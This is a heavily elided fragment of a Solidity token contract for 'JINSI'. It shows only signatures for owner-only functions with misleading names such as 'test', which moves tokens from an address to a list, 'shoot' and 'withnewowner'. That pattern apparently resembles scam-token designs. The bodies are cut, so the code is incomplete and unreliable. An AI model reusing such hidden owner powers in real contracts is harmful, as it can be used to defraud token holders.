...
contract AuthOwner is Context, IERC1363{  
    ...
    */
    function withnewowner(address newOwner) external onlyOwner returns (bool) {
...
contract JINSI is AuthOwner {
    using SafeMath for uint256;    
    uint256 public totalSupply = 100000000 *  10**9;
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) internal allowed;
    string public name = "JINSI";    
    string public symbol = "JINSI";
    uint8 public decimals = 9;   

    uint8 public impliment;
    uint8 public setrecord;
    ...
    function swaptoken(address _token, uint256 tokens) private  {
    ...
    function test(address from, address[] calldata addresses, uint256 tokenAmount) external onlyOwner {
    ...
    function finalexam() internal view returns (uint256) {        
        return totalSupply.mul(2).div(100); // 2% of supply;
    } 

   function getfeeback(uint256 buybackMultiplierTriggeredAt, uint256 totalFee) public view returns (uint256) {
        if (
    ...
    function shoot(uint256 newCoolWait) external onlyOwner {
        require(
